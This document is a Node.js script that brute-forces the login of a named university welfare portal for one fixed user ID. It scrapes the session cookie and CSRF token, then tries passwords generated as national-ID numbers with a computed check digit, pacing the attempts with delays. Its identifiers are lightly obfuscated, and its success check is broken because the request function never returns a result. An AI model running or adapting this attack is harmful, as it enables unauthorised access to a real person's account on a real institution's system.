const rq = require("request-promise-native");
var request = require("request");

const cityCode = "372";
const userId = "9728103";
let J_S3$$ion = "";
let c$rf = "";
// const start = parseInt(process.argv[2]);
// const end = parseInt(process.argv[3]);

function __get_c$rf(b0dy) {
  let start = b0dy.search("'X-CSRF-TOKEN' : '") + 18;
  let i;
  for (i = start; ; i++) {
    if (b0dy.charAt(i) === "'") break;
  }
  return b0dy.substring(start, i);
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

const controllGenerator = (idWithoutControll) => {
  let sum = 0;

  for (let i = 0; i < 9; i++) {
    sum += parseInt(idWithoutControll[i]) * (10 - i);
  }
  sum %= 11;

  return sum < 2 ? sum : 11 - sum;
};

const zeroPad = (num, places) => String(num).padStart(places, "0");

async function get_1n1t1al_JS3$_c$rf() {
  var options = {
    method: "GET",
    url: "http://refahi.kntu.ac.ir/index.rose",
    headers: {
      "User-Agent": "sun_0f_beach",
    },
    resolveWithFullResponse: true,
  };

  return await rq(options).then((response) => {
    J_S3$$ion = response.headers["set-cookie"][0].substring(0, 43);
    c$rf = __get_c$rf(response.body);
  });
}

async function post_Js3c(user) {
  var options = {
    method: "POST",
    url: "http://refahi.kntu.ac.ir/j_security_check",
    headers: {
      Accept: "application/json",
      Cookie: J_S3$$ion,
      "Content-Type": "application/x-www-form-urlencoded",
    },
    form: {
      username: user.name,
      password: user.pass,
      _csrf: c$rf,
      login: "%D9%88%D8%B1%D9%88%D8%AF",
    },
    resolveWithFullResponse: true,
    simple: false,
    timeout: 5000,
  };

  request(options, function (error, response) {
    if (error) return null;
    if (response.headers["set-cookie"]) {
      return {
        JSESSION: response.headers["set-cookie"][0].substring(0, 43),
        USERNAME: options.form.username,
        PASSWORD: options.form.password,
      };
    }
  });
}

async function main() {
  let id = 0;
  await get_1n1t1al_JS3$_c$rf();

  for (let j = 166; j < 169; j++) {
    for (let i = id + 500 * j; i < id + 500 * (j + 1); i++) {
      let idWithoutControll = cityCode + zeroPad(i, 6);
      let validId = idWithoutControll + controllGenerator(idWithoutControll);
      if (post_Js3c({ name: userId, pass: validId })) {
        console.log(i);
        break;
      }
    }
    console.log(`from ${500 * j} to ${500 * (j + 1)} `);
    await sleep(5000);
  }
  console.log(id);
  for (let j = 0; j < 50; j++) {
    for (let i = id + 10 * j; i < id + 10 * (j + 1); i++) {
      let idWithoutControll = cityCode + zeroPad(i, 6);
      let validId = idWithoutControll + controllGenerator(idWithoutControll);
      if (post_Js3c({ name: userId, pass: validId })) {
        id = i;
        break;
      }
    }
    console.log(`from ${id + 10 * j} to ${id + 10 * (j + 1)} `);
    await sleep(200);
  }

  for (let i = id; i < id + 10; i++) {
    let idWithoutControll = cityCode + zeroPad(i, 6);
    let validId = idWithoutControll + controllGenerator(idWithoutControll);
    if (post_Js3c({ name: userId, pass: validId })) {
      id = i;
      break;
    }
    console.log(`id : ${i} `);
    await sleep(200);
  }
}

main();
